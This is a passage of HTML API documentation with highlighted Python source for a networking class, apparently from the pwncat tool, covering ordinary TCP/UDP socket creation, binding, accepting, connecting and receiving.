                                    class="hljs-keyword">in</span> conns], self.__ssig.has_sock_quit
            )
            conns[conn.family][<span class="hljs-string">"conn"</span>] = conn
            conns[conn.family][<span class="hljs-string">"remote_addr"</span>] = client[<span
                                    class="hljs-number">0</span>]
            conns[conn.family][<span class="hljs-string">"remote_port"</span>] = client[<span
                                    class="hljs-number">1</span>]
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> err:
            remove = {family: str(err) <span class="hljs-keyword">for</span> family <span
                                    class="hljs-keyword">in</span> conns}
        <span class="hljs-comment"># On error, remove all bind sockets</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__log.debug(
                <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># (3/3) Store connections</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                                    class="hljs-keyword">in</span> conns[family]:
                self.__active = {
                    <span class="hljs-string">"af"</span>: family,
                    <span class="hljs-string">"conn"</span>: conns[family][<span
                                    class="hljs-string">"conn"</span>],
                    <span class="hljs-string">"remote_addr"</span>: conns[family][<span
                                    class="hljs-string">"remote_addr"</span>],
                    <span class="hljs-string">"remote_port"</span>: conns[family][<span
                                    class="hljs-string">"remote_port"</span>],
                }
                <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> self.__sock.get_sock_opts(self.__active[<span
                                    class="hljs-string">"conn"</span>], self.__options.info):
                    self.__log.info(<span class="hljs-string">"[%s] %s"</span>, self.__sock.get_family_name(family), info)
        self.__conns = conns
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re_accept_client</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Re-accept new clients, if connection is somehow closed or accept did not work.

        Returns:
            bool: Returns `True` on success and `False` and error.
        """</span>
        <span class="hljs-comment"># [1/3] Close and remove all previous conn sockets</span>
        self.close_conn_sock()
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                                    class="hljs-keyword">in</span> self.__conns[family]:
                <span class="hljs-keyword">del</span> self.__conns[family][<span
                                    class="hljs-string">"conn"</span>]

        <span class="hljs-comment"># [2/3] Accept</span>
        <span class="hljs-keyword">try</span>:
            conn, client = self.__sock.accept(
                [self.__conns[family][<span class="hljs-string">"sock"</span>] <span
                                    class="hljs-keyword">for</span> family <span
                                    class="hljs-keyword">in</span> self.__conns], self.__ssig.has_sock_quit
            )
        <span class="hljs-keyword">except</span> socket.error:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        self.__conns[conn.family][<span class="hljs-string">"conn"</span>] = conn
        self.__conns[conn.family][<span class="hljs-string">"remote_addr"</span>] = client[<span
                                    class="hljs-number">0</span>]
        self.__conns[conn.family][<span class="hljs-string">"remote_port"</span>] = client[<span
                                    class="hljs-number">1</span>]

        <span class="hljs-comment"># Update active connection socket</span>
        self.__active = {
            <span class="hljs-string">"af"</span>: conn.family,
            <span class="hljs-string">"conn"</span>: conn,
            <span class="hljs-string">"remote_addr"</span>: client[<span
                                    class="hljs-number">0</span>],
            <span class="hljs-string">"remote_port"</span>: client[<span
                                    class="hljs-number">1</span>],
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">close_bind_sock</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Close the bind socket used by the server to accept clients."""</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"sock"</span> <span
                                    class="hljs-keyword">in</span> self.__conns[family]:
                self.__sock.close(self.__conns[family][<span
                                    class="hljs-string">"sock"</span>], <span class="hljs-string">"sock"</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">close_conn_sock</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Close the communication socket used for send and receive."""</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                                    class="hljs-keyword">in</span> self.__conns[family]:
                self.__sock.close(self.__conns[family][<span
                                    class="hljs-string">"conn"</span>], <span class="hljs-string">"conn"</span>)</code></pre>
                    </details>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.Net.close_bind_sock"><code class="name flex">
                            <span>def <span
                                    class="ident">close_bind_sock</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Close the bind socket used by the server to accept
                                clients.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">close_bind_sock</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Close the bind socket used by the server to accept clients."""</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
        <span class="hljs-keyword">if</span> <span class="hljs-string">"sock"</span> <span
                                            class="hljs-keyword">in</span> self.__conns[family]:
            self.__sock.close(self.__conns[family][<span class="hljs-string">"sock"</span>], <span
                                            class="hljs-string">"sock"</span>)</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Net.close_conn_sock"><code class="name flex">
                            <span>def <span
                                    class="ident">close_conn_sock</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Close the communication socket used for send and
                                receive.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">close_conn_sock</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Close the communication socket used for send and receive."""</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
        <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                                            class="hljs-keyword">in</span> self.__conns[family]:
            self.__sock.close(self.__conns[family][<span class="hljs-string">"conn"</span>], <span
                                            class="hljs-string">"conn"</span>)</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Net.re_accept_client"><code class="name flex">
                            <span>def <span
                                    class="ident">re_accept_client</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Re-accept new clients, if connection is somehow
                                closed or accept did not work.</p>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>bool</code></dt>
                                    <dd>Returns <code>True</code> on success and <code>False</code>
                                        and error.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">re_accept_client</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""Re-accept new clients, if connection is somehow closed or accept did not work.

    Returns:
        bool: Returns `True` on success and `False` and error.
    """</span>
    <span class="hljs-comment"># [1/3] Close and remove all previous conn sockets</span>
    self.close_conn_sock()
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
        <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                                            class="hljs-keyword">in</span> self.__conns[family]:
            <span class="hljs-keyword">del</span> self.__conns[family][<span class="hljs-string">"conn"</span>]

    <span class="hljs-comment"># [2/3] Accept</span>
    <span class="hljs-keyword">try</span>:
        conn, client = self.__sock.accept(
            [self.__conns[family][<span class="hljs-string">"sock"</span>] <span
                                            class="hljs-keyword">for</span> family <span
                                            class="hljs-keyword">in</span> self.__conns], self.__ssig.has_sock_quit
        )
    <span class="hljs-keyword">except</span> socket.error:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    self.__conns[conn.family][<span class="hljs-string">"conn"</span>] = conn
    self.__conns[conn.family][<span class="hljs-string">"remote_addr"</span>] = client[<span
                                            class="hljs-number">0</span>]
    self.__conns[conn.family][<span class="hljs-string">"remote_port"</span>] = client[<span
                                            class="hljs-number">1</span>]

    <span class="hljs-comment"># Update active connection socket</span>
    self.__active = {
        <span class="hljs-string">"af"</span>: conn.family,
        <span class="hljs-string">"conn"</span>: conn,
        <span class="hljs-string">"remote_addr"</span>: client[<span class="hljs-number">0</span>],
        <span class="hljs-string">"remote_port"</span>: client[<span class="hljs-number">1</span>],
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Net.receive"><code class="name flex">
                            <span>def <span class="ident">receive</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Receive and return data from the connected (TCP) or
                                unconnected (UDP) socket.</p>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>bytes</code></dt>
                                    <dd>Returns received data from connected (TCP) or unconnected
                                        (UDP) socket.
                                    </dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.timeout</code></dt>
                                    <dd>Except here to do an action when the socket is not busy.
                                    </dd>
                                    <dt><code>AttributeError</code></dt>
                                    <dd>Except here when current instance has closed itself
                                        (Ctrl+c).
                                    </dd>
                                    <dt><code>socket.error</code></dt>
                                    <dd>Except here when unconnected or connection was forcibly
                                        closed.
                                    </dd>
                                    <dt><code>EOFError</code></dt>
                                    <dd>
                                        <p>Except here when upstream has closed the connection via
                                            EOF.</p>
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">receive</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bytes</span>
    <span class="hljs-string">"""Receive and return data from the connected (TCP) or unconnected (UDP) socket.

    Returns:
        bytes: Returns received data from connected (TCP) or unconnected (UDP) socket.

    Raises:
        socket.timeout: Except here to do an action when the socket is not busy.
        AttributeError: Except here when current instance has closed itself (Ctrl+c).
        socket.error:   Except here when unconnected or connection was forcibly closed.
        EOFError:       Except here when upstream has closed the connection via EOF.
    """</span>
    <span class="hljs-comment"># This is required for a UDP server that has no connected clients yet</span>
    <span class="hljs-comment"># and is waiting for data receival for the first time on either IPv4 or IPv6</span>
    <span class="hljs-comment"># to finally determine which of those two we're going to use and which</span>
    <span class="hljs-comment"># of them we will remove after succesfull connect.</span>
    <span class="hljs-keyword">try</span>:
        conns = select.select(
            [self.__conns[af][<span class="hljs-string">"conn"</span>] <span class="hljs-keyword">for</span> af <span
                                            class="hljs-keyword">in</span> self.__conns <span
                                            class="hljs-keyword">if</span> <span
                                            class="hljs-string">"conn"</span> <span
                                            class="hljs-keyword">in</span> self.__conns[af]],
            [],
            [],
            self.__options.recv_timeout,
        )[
            <span class="hljs-number">0</span>
        ]  <span class="hljs-comment"># type: List[socket.socket]</span>
    <span class="hljs-comment"># E.g.: ValueError: file descriptor cannot be a negative integer (-1)</span>
    <span class="hljs-keyword">except</span> (ValueError, AttributeError) <span
                                            class="hljs-keyword">as</span> error:
        msg = <span class="hljs-string">"Connection was closed by self: [1]: {}"</span>.format(error)
        self.__log.debug(msg)
        <span class="hljs-keyword">raise</span> AttributeError(msg)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
        <span class="hljs-comment"># This is raised for the calling function to determine what to do</span>
        <span class="hljs-comment"># between timeouts (e.g.: check signals, etc)</span>
        <span class="hljs-keyword">raise</span> socket.timeout(<span
                                            class="hljs-string">"timed out"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>

    <span class="hljs-comment"># We should always only have one active socket on which we receive data.</span>
    <span class="hljs-keyword">assert</span> len(conns) == <span class="hljs-number">1</span>
    conn = conns[<span class="hljs-number">0</span>]  <span class="hljs-comment"># type: socket.socket</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># https://manpages.debian.org/buster/manpages-dev/recv.2.en.html</span>
        (data, addr) = conn.recvfrom(self.__options.bufsize)

    <span class="hljs-comment"># [1/5] When closing itself (e.g.: via Ctrl+c and the socket_close() funcs are called)</span>
    <span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> error:
        msg = <span class="hljs-string">"Connection was closed by self: [2]: {}"</span>.format(error)
        self.__log.debug(msg)
        <span class="hljs-keyword">raise</span> AttributeError(msg)

    <span class="hljs-comment"># [2/5] Connection was forcibly closed</span>
    <span class="hljs-comment"># [Errno 107] Transport endpoint is not connected</span>
    <span class="hljs-comment"># [Errno 10054] An existing connection was forcibly closed by the remote host</span>
    <span class="hljs-comment"># [WinError 10054] An existing connection was forcibly closed by the remote host</span>
    <span class="hljs-keyword">except</span> (OSError, socket.error) <span
                                            class="hljs-keyword">as</span> error:
        self.__log.debug(<span class="hljs-string">"Connection error: %s"</span>, error)
        <span class="hljs-keyword">raise</span> socket.error(error)

    <span class="hljs-comment"># [3/5] Upstream (server or client) is gone.</span>
    <span class="hljs-comment"># In TCP, there is no such thing as an empty message, so zero means a peer disconnect.</span>
    <span class="hljs-comment"># In UDP, there is no such thing as a peer disconnect, so zero means an empty datagram.</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
        msg = <span class="hljs-string">"EOF: Remote finished sending."</span>
        self.__log.info(msg)
        <span class="hljs-keyword">raise</span> EOFError(msg)

    <span class="hljs-comment"># [4/5] (UDP Server mode only)</span>
    <span class="hljs-comment"># 1.) The UDP server is only able to send data, if a client has sent data first,</span>
    <span class="hljs-comment"># as we do not do a connect() phase for UDP and therefore do not know its remote</span>
    <span class="hljs-comment"># addr/port before. See send() function for a blocking loop.</span>
    <span class="hljs-comment"># 2.) Additionally, we will always update its IP/port values to distinguish</span>
    <span class="hljs-comment"># the same connected client between a new/different connected client.</span>
    <span class="hljs-keyword">if</span> self.__udp_mode_server:
        <span class="hljs-comment"># UDP client connects for the first time</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__active:
            self.__log.info(
                <span class="hljs-string">"Client connected: %s:%d (family %d/%s, UDP)"</span>,
                addr[<span class="hljs-number">0</span>],
                addr[<span class="hljs-number">1</span>],
                int(conn.family),
                self.__sock.get_family_name(conn.family),
            )
        <span class="hljs-comment"># A different UDP client connects</span>
        <span class="hljs-keyword">elif</span> self.__active[<span
                                            class="hljs-string">"remote_addr"</span>] != addr[<span
                                            class="hljs-number">0</span>] <span
                                            class="hljs-keyword">or</span> self.__active[<span
                                            class="hljs-string">"remote_port"</span>] != addr[<span
                                            class="hljs-number">1</span>]:
            self.__log.info(
                <span class="hljs-string">"New client connected: %s:%d (family %d/%s, UDP)"</span>,
                addr[<span class="hljs-number">0</span>],
                addr[<span class="hljs-number">1</span>],
                int(conn.family),
                self.__sock.get_family_name(conn.family),
            )
        <span class="hljs-comment"># Set currently active UDP connection socket</span>
        self.__active = {
            <span class="hljs-string">"af"</span>: conn.family,
            <span class="hljs-string">"conn"</span>: conn,
            <span class="hljs-string">"remote_addr"</span>: addr[<span class="hljs-number">0</span>],
            <span class="hljs-string">"remote_port"</span>: addr[<span class="hljs-number">1</span>],
        }

    <span class="hljs-comment"># [5/5] We have data to process</span>
    self.__log.debug(
        <span class="hljs-string">"Received %d bytes from %s:%d"</span>,
        len(data),
        self.__active[<span class="hljs-string">"remote_addr"</span>],
        self.__active[<span class="hljs-string">"remote_port"</span>],
    )
    self.__log.trace(<span class="hljs-string">"Received: %s"</span>, repr(data))  <span
                                            class="hljs-comment"># type: ignore</span>
    <span class="hljs-keyword">return</span> data</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Net.run_client"><code class="name flex">
                            <span>def <span class="ident">run_client</span></span>(<span>self, host, port)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Run and create a TCP or UDP client and connect to a
                                remote peer.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>addr</code></strong> :<code>str</code></dt>
                                    <dd>Numeric IP address to connect to (ensure to resolve a
                                        hostname beforehand).
                                    </dd>
                                    <dt><strong><code>port</code></strong> :<code>int</code></dt>
                                    <dd>Port of the server to connect to.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>bool</code></dt>
                                    <dd>Returns <code>True</code> on success and <code>False</code>
                                        on failure.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">run_client</span>(<span
                                        class="hljs-params">self, host, port</span>):</span>
    <span class="hljs-comment"># type: (str, int) -&gt; bool</span>
    <span class="hljs-string">"""Run and create a TCP or UDP client and connect to a remote peer.

    Args:
        addr (str): Numeric IP address to connect to (ensure to resolve a hostname beforehand).
        port (int): Port of the server to connect to.

    Returns:
        bool: Returns `True` on success and `False` on failure.
    """</span>
    <span class="hljs-comment"># The connection dictionary.</span>
    conns = {}  <span class="hljs-comment"># type: Dict[int, SockConn]</span>

    <span class="hljs-comment"># [1/4] Add sockets to connection dictionary</span>
    succ = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
        <span class="hljs-keyword">try</span>:
            conns[family] = {
                <span class="hljs-string">"conn"</span>: self.__sock.create_socket(
                    family,
                    socket.SOCK_DGRAM <span class="hljs-keyword">if</span> self.__options.udp <span
                                            class="hljs-keyword">else</span> socket.SOCK_STREAM,
                    <span class="hljs-literal">True</span>,
                    self.__options.ip_tos,
                )
            }
            succ += <span class="hljs-number">1</span>
        <span class="hljs-keyword">except</span> socket.error:
            <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">if</span> succ == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [2/4] Resolve address</span>
    remove = []
    errors = []
    <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> We're still looping over the initial family list</span>
    <span class="hljs-comment"># to ensure order: IPv6 before IPv4 (the conn dict does not preserve order)</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
        <span class="hljs-keyword">if</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">try</span>:
                conns[family][<span class="hljs-string">"remote_host"</span>] = host
                conns[family][<span class="hljs-string">"remote_addr"</span>] = self.__sock.gethostbyname(
                    host, family, <span class="hljs-keyword">not</span> self.__options.nodns
                )
                conns[family][<span class="hljs-string">"remote_port"</span>] = port
            <span class="hljs-keyword">except</span> socket.gaierror <span
                                            class="hljs-keyword">as</span> err:
                remove.append(family)
                errors.append(str(err))
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
        self.__sock.close(conns[family][<span class="hljs-string">"conn"</span>], self.__sock.get_family_name(family))
        <span class="hljs-keyword">del</span> conns[family]
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
        <span class="hljs-keyword">for</span> error <span class="hljs-keyword">in</span> errors:
            self.__log.error(<span class="hljs-string">"Resolve Error: %s"</span>, error)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [3/4] Connect</span>
    remove = []
    errors = []
    <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> We're still looping over the initial family list</span>
    <span class="hljs-comment"># to ensure order: IPv6 before IPv4 (the conn dict does not preserve order)</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
        <span class="hljs-keyword">if</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">try</span>:
                self.__sock.connect(
                    conns[family][<span class="hljs-string">"conn"</span>],
                    conns[family][<span class="hljs-string">"remote_addr"</span>],
                    conns[family][<span class="hljs-string">"remote_port"</span>],
                    self.__options.src_addr,
                    self.__options.src_port,
                    self.__options.udp_sconnect,
                    self.__enc.encode(self.__options.udp_sconnect_word),
                    self.__options.bufsize,
                )
                <span class="hljs-comment"># On successful connect, we can abandon/remove all other sockets</span>
                remove = [key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> conns <span
                                            class="hljs-keyword">if</span> key != family]
                <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">except</span> (OSError, socket.error) <span
                                            class="hljs-keyword">as</span> err:
                remove.append(family)
                errors.append(str(err))
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
        self.__sock.close(conns[family][<span class="hljs-string">"conn"</span>], self.__sock.get_family_name(family))
        <span class="hljs-keyword">del</span> conns[family]
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
        <span class="hljs-keyword">for</span> error <span class="hljs-keyword">in</span> errors:
            self.__log.error(error)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [4/4] Store connections and set active connection</span>
    <span class="hljs-keyword">assert</span> len(conns) == <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
        self.__active = {
            <span class="hljs-string">"af"</span>: family,
            <span class="hljs-string">"conn"</span>: conns[family][<span
                                            class="hljs-string">"conn"</span>],
            <span class="hljs-string">"remote_addr"</span>: conns[family][<span class="hljs-string">"remote_addr"</span>],
            <span class="hljs-string">"remote_port"</span>: conns[family][<span class="hljs-string">"remote_port"</span>],
        }
    <span class="hljs-comment"># Store sockets as a list</span>
    self.__conns = conns
    <span class="hljs-comment"># Print socket info</span>
    <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> self.__sock.get_sock_opts(self.__active[<span
                                            class="hljs-string">"conn"</span>], self.__options.info):
        self.__log.info(<span class="hljs-string">"[%s] %s"</span>, self.__sock.get_family_name(family), info)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Net.run_server"><code class="name flex">
                            <span>def <span class="ident">run_server</span></span>(<span>self, host, port)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Run and create a TCP or UDP listening server and
                                wait for a client to connect.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>addr</code></strong> :<code>str</code></dt>
                                    <dd>Numeric IP address to bind to (ensure to resolve a hostname
                                        beforehand).
                                    </dd>
                                    <dt><strong><code>port</code></strong> :<code>int</code></dt>
                                    <dd>Port of the address to bind to.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>bool</code></dt>
                                    <dd>Returns <code>True</code> on success and <code>False</code>
                                        on failure.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">run_server</span>(<span
                                        class="hljs-params">self, host, port</span>):</span>
    <span class="hljs-comment"># type: (Optional[str], int) -&gt; bool</span>
    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Integrate: --rebind(-wait|-robin)</span>
    <span class="hljs-string">"""Run and create a TCP or UDP listening server and wait for a client to connect.

    Args:
        addr (str): Numeric IP address to bind to (ensure to resolve a hostname beforehand).
        port (int): Port of the address to bind to.

    Returns:
        bool: Returns `True` on success and `False` on failure.
    """</span>
    <span class="hljs-comment"># The connection dictionary.</span>
    conns = {}  <span class="hljs-comment"># type: Dict[int, SockConn]</span>

    <span class="hljs-comment"># [1/4] Create socket</span>
    succ = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
        <span class="hljs-keyword">try</span>:
            conns[family] = {
                <span class="hljs-string">"sock"</span>: self.__sock.create_socket(
                    family,
                    socket.SOCK_DGRAM <span class="hljs-keyword">if</span> self.__options.udp <span
                                            class="hljs-keyword">else</span> socket.SOCK_STREAM,
                    <span class="hljs-literal">True</span>,
                    self.__options.ip_tos,
                )
            }
            succ += <span class="hljs-number">1</span>
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> err:
            self.__log.debug(err)
    <span class="hljs-keyword">if</span> succ == <span class="hljs-number">0</span>:
        self.__log.error(<span class="hljs-string">"Socket Error: Could not create any socket."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [2/4] Resolve local address</span>
    remove = {}
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
        <span class="hljs-keyword">try</span>:
            conns[family][<span class="hljs-string">"local_addr"</span>] = self.__sock.gethostbyname(
                host, family, <span class="hljs-keyword">not</span> self.__options.nodns
            )
            conns[family][<span class="hljs-string">"local_host"</span>] = host
            conns[family][<span class="hljs-string">"local_port"</span>] = port
        <span class="hljs-keyword">except</span> socket.gaierror <span
                                            class="hljs-keyword">as</span> err:
            remove[family] = str(err)
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
        self.__log.debug(
            <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
            family,
            self.__sock.get_family_name(family),
            remove[family],
        )
        self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
        <span class="hljs-keyword">del</span> conns[family]
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
        self.__log.error(<span class="hljs-string">"Resolve Error: Could not resolve any hostname"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [3/4] Bind socket</span>
    remove = {}
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
        <span class="hljs-keyword">try</span>:
            self.__sock.bind(conns[family][<span
                                            class="hljs-string">"sock"</span>], conns[family][<span
                                            class="hljs-string">"local_addr"</span>], port)
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> err:
            remove[family] = str(err)
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
        self.__log.debug(
            <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
            family,
            self.__sock.get_family_name(family),
            remove[family],
        )
        self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
        <span class="hljs-keyword">del</span> conns[family]
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
        self.__log.error(<span class="hljs-string">"Bind Error: Could not bind any socket"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [UDP 4/4] There is no listen or accept for UDP</span>
    <span class="hljs-keyword">if</span> self.__options.udp:
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            conns[family][<span class="hljs-string">"conn"</span>] = conns[family][<span
                                            class="hljs-string">"sock"</span>]
            self.__log.info(
                <span class="hljs-string">"Listening on %s:%d (family %d/%s, UDP)"</span>,
                conns[family][<span class="hljs-string">"local_addr"</span>],
                conns[family][<span class="hljs-string">"local_port"</span>],
                family,
                self.__sock.get_family_name(family),
            )
        self.__conns = conns
        self.__udp_mode_server = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-comment"># [TCP 4/4] Requires listen and accept</span>
    <span class="hljs-comment"># (1/3) Listen</span>
    remove = {}
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
        <span class="hljs-keyword">try</span>:
            self.__sock.listen(conns[family][<span class="hljs-string">"sock"</span>], self.__options.backlog)
            self.__log.info(
                <span class="hljs-string">"Listening on %s:%d (family %d/%s, TCP)"</span>,
                conns[family][<span class="hljs-string">"local_addr"</span>],
                conns[family][<span class="hljs-string">"local_port"</span>],
                family,
                self.__sock.get_family_name(family),
            )
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> err:
            remove[family] = str(err)
    <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
        self.__log.debug(
            <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
            family,
            self.__sock.get_family_name(family),
            remove[family],
        )
        self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
        <span class="hljs-keyword">del</span> conns[family]
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
        self.__log.error(<span class="hljs-string">"Could not listen on any address"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># (2/3) Accept</span>
    remove = {}
    <span class="hljs-keyword">try</span>:
        conn, client = self.__sock.accept(
            [conns[family][<span class="hljs-string">"sock"</span>] <span
                                            class="hljs-keyword">for</span> family <span
                                            class="hljs-keyword">in</span> conns], self.__ssig.has_sock_quit
        )
        conns[conn.family][<span class="hljs-string">"conn"</span>] = conn
